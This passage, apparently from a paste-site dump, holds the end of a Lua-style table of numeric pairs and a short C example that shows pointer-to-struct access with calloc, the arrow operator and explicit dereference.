	temp[1097] = {{0, 23}, {0, 28}, {0, -3}, }
	temp[1098] = {}
	temp[1099] = {{0, 2}, }
	temp[1100] = {}
	temp[1101] = {{0, 26}, }
	temp[1102] = {}
	temp[1103] = {{0, 4}, }
	temp[1104] = {}
	temp[1105] = {{0, 21}, {0, 25}, {0, 6}, }
	temp[1106] = {}
	temp[1107] = {}
	temp[1108] = {}
	temp[1109] = {{0, 2}, }
	temp[1110] = {}
	temp[1111] = {}
	temp[1112] = {}
	temp[1113] = {{0, 23}, {0, -3}, }
	temp[1114] = {}
	temp[1115] = {}
	temp[1116] = {}
	temp[1117] = {{0, 21}, {0, 25}, {0, -6}, }
	temp[1118] = {}
	temp[1119] = {}
	temp[1120] = {}
	temp[1121] = {{0, 20}, {0, 23}, {0, 1}, }
	temp[1122] = {}
	temp[1123] = {}
	temp[1124] = {}
	temp[1125] = {{0, -3}, }
	temp[1126] = {}
	temp[1127] = {}
	temp[1128] = {}
	temp[1129] = {{0, 21}, {0, 25}, {0, -6}, }
	temp[1130] = {}
	temp[1131] = {}
	temp[1132] = {}
	temp[1133] = {{0, 20}, {0, 23}, {0, 1}, }
	temp[1134] = {}
	temp[1135] = {}
	temp[1136] = {}
	temp[1137] = {{0, -3}, }
	temp[1138] = {}
	temp[1139] = {}
	temp[1140] = {}
	temp[1141] = {{0, 20}, {0, 23}, {0, -8}, }
	temp[1142] = {}
	temp[1143] = {}
	temp[1144] = {}
	temp[1145] = {{0, -8}, }
	temp[1146] = {}
	temp[1147] = {}
	temp[1148] = {}
	temp[1149] = {{0, 18}, {0, 23}, }
	temp[1150] = {}
	temp[1151] = {}
	temp[1152] = {}
	temp[1153] = {{0, 21}, {0, -20}, }
	temp[1154] = {}
	temp[1155] = {}
	temp[1156] = {}
	temp[1157] = {{0, 20}, {0, -8}, }
	temp[1158] = {}
	temp[1159] = {{0, -20}, }
	temp[1160] = {}
	temp[1161] = {{0, 18}, }
	temp[1162] = {}
	temp[1163] = {}
	temp[1164] = {}
	temp[1165] = {{0, 18}, {0, -13}, {0, -1}, }
	temp[1166] = {}
	temp[1167] = {}
	temp[1168] = {}
	temp[1169] = {{0, -13}, }
	temp[1170] = {}
	temp[1171] = {{0, -6}, }
	temp[1172] = {}
	temp[1173] = {{0, -1}, }
	temp[1174] = {}
	temp[1175] = {{0, 1}, }
	temp[1176] = {}
	temp[1177] = {{0, 18}, {0, 25}, {0, 2}, }
	temp[1178] = {{0, 30}, }
	temp[1179] = {}
	temp[1180] = {}
	temp[1181] = {{0, -1}, }
	temp[1182] = {}
	temp[1183] = {}
	temp[1184] = {}
	temp[1185] = {{0, -6}, }
	temp[1186] = {}
	temp[1187] = {}
	temp[1188] = {}
	temp[1189] = {{0, -10}, }
	temp[1190] = {}
	temp[1191] = {}
	temp[1192] = {}
	temp[1193] = {{0, 23}, {0, 28}, {0, -3}, }
	temp[1194] = {}
	temp[1195] = {{0, 2}, }
	temp[1196] = {}
	temp[1197] = {{0, 26}, }
	temp[1198] = {}
	temp[1199] = {{0, 4}, }
	temp[1200] = {}
	temp[1201] = {{0, 21}, {0, 25}, {0, 6}, }
	temp[1202] = {}
	temp[1203] = {}
	temp[1204] = {}
	temp[1205] = {{0, 2}, }
	temp[1206] = {}
	temp[1207] = {}
	temp[1208] = {}
	temp[1209] = {{0, 23}, {0, -3}, }
	temp[1210] = {}
	temp[1211] = {}
	temp[1212] = {}
	temp[1213] = {{0, 21}, {0, 25}, {0, -6}, }
	temp[1214] = {}
	temp[1215] = {}
	temp[1216] = {}
	temp[1217] = {{0, 20}, {0, 23}, {0, 1}, }
	temp[1218] = {}
	temp[1219] = {}
	temp[1220] = {}
	temp[1221] = {{0, -3}, }
	temp[1222] = {}
	temp[1223] = {}
	temp[1224] = {}
	temp[1225] = {{0, 21}, {0, 25}, {0, -6}, }
	temp[1226] = {}
	temp[1227] = {}
	temp[1228] = {}
	temp[1229] = {{0, 23}, {0, 28}, {0, 1}, }
	temp[1230] = {}
	temp[1231] = {}
	temp[1232] = {}
	temp[1233] = {{0, 18}, {0, -3}, }
	temp[1234] = {}
	temp[1235] = {}
	temp[1236] = {}
	temp[1237] = {{0, 20}, {0, -8}, }
	temp[1238] = {}
	temp[1239] = {}
	temp[1240] = {}
	temp[1241] = {{0, -1}, }
	temp[1242] = {}
	temp[1243] = {}
	temp[1244] = {}
	temp[1245] = {{0, 21}, }
	temp[1246] = {}
	temp[1247] = {}
	temp[1248] = {}
	temp[1249] = {{0, 18}, {0, -8}, }
	temp[1250] = {}
	temp[1251] = {}
	temp[1252] = {}
	temp[1253] = {{0, 2}, }
	temp[1254] = {}
	temp[1255] = {}
	temp[1256] = {}
	temp[1257] = {{0, 1}, }
	temp[1258] = {}
	temp[1259] = {}
	temp[1260] = {}
	temp[1261] = {{0, -1}, }
	temp[1262] = {}
	temp[1263] = {}
	temp[1264] = {}
	temp[1265] = {{0, 18}, }
	temp[1266] = {}
	temp[1267] = {}
	temp[1268] = {}
	temp[1269] = {{0, 18}, }
	temp[1270] = {}
	temp[1271] = {}
	temp[1272] = {}
	temp[1273] = {{0, -6}, }
	temp[1274] = {}
	temp[1275] = {}
	temp[1276] = {}
	temp[1277] = {{0, 18}, }
	temp[1278] = {}
	temp[1279] = {}
	temp[1280] = {}
	temp[1281] = {{0, 18}, }
	temp[1282] = {}
	temp[1283] = {}
	temp[1284] = {}
	temp[1285] = {{0, -10}, }
	temp[1286] = {}
	temp[1287] = {}
	temp[1288] = {}
	temp[1289] = {{0, 18}, }
	temp[1290] = {}
	temp[1291] = {}
	temp[1292] = {}
	temp[1293] = {{0, 18}, }
	temp[1294] = {}
	temp[1295] = {}
	temp[1296] = {}
	temp[1297] = {{0, -3}, }
	temp[1298] = {}
	temp[1299] = {}
	temp[1300] = {}
	temp[1301] = {{0, 18}, }
	temp[1302] = {}
	temp[1303] = {}
	temp[1304] = {}
	temp[1305] = {{0, 18}, }
	temp[1306] = {}
	temp[1307] = {}
	temp[1308] = {}
	temp[1309] = {{0, -11}, }
	temp[1310] = {}
	temp[1311] = {}
	temp[1312] = {}
	temp[1313] = {{0, 18}, }
	temp[1314] = {}
	temp[1315] = {}
	temp[1316] = {}
	temp[1317] = {{0, 18}, }
	temp[1318] = {}
	temp[1319] = {}
	temp[1320] = {}
	temp[1321] = {{0, -6}, }
	temp[1322] = {}
	temp[1323] = {}
	temp[1324] = {}
	temp[1325] = {{0, 18}, }
	temp[1326] = {}
	temp[1327] = {}
	temp[1328] = {}
	temp[1329] = {{0, 18}, }
	temp[1330] = {}
	temp[1331] = {}
	temp[1332] = {}
	temp[1333] = {{0, -8}, }
	temp[1334] = {}
	temp[1335] = {}
	temp[1336] = {}
	temp[1337] = {{0, 16}, }
	temp[1338] = {}
	temp[1339] = {}
	temp[1340] = {}
	temp[1341] = {{0, 16}, }
	temp[1342] = {}
	temp[1343] = {}
	temp[1344] = {}
	temp[1345] = {{0, 11}, {0, 16}, {0, -1}, {0, 4}, }
	temp[1346] = {}
	temp[1347] = {}
	temp[1348] = {}
	temp[1349] = {{0, 9}, {0, 16}, {0, 1}, }
	temp[1350] = {}
	temp[1351] = {}
	temp[1352] = {}
	temp[1353] = {{0, 11}, {0, 16}, {0, 2}, }
	temp[1354] = {}
	temp[1355] = {}
	temp[1356] = {}
	temp[1357] = {{0, 9}, {0, 13}, {0, 18}, {0, -13}, {0, -1}, {0, 4}, }

	return temp
end"
v6ud42e0,Example of basic pointer to struct in C Language and operators.,XeBuZer0,C,Friday 2nd of June 2023 12:20:25 PM CDT,"#include <stdio.h>
#include <stdlib.h>

typedef struct myType{
	int x;
	int y;
} miTipo;

int main(void){
	miTipo *z = NULL;
	z = calloc(1,sizeof(miTipo));
	z -> x = 10;
	(*z).y = 15;
	printf(""primero: %i, segundo: %i\n"", z->x , (*z).y);
	free(z);
	return 0;	
}"
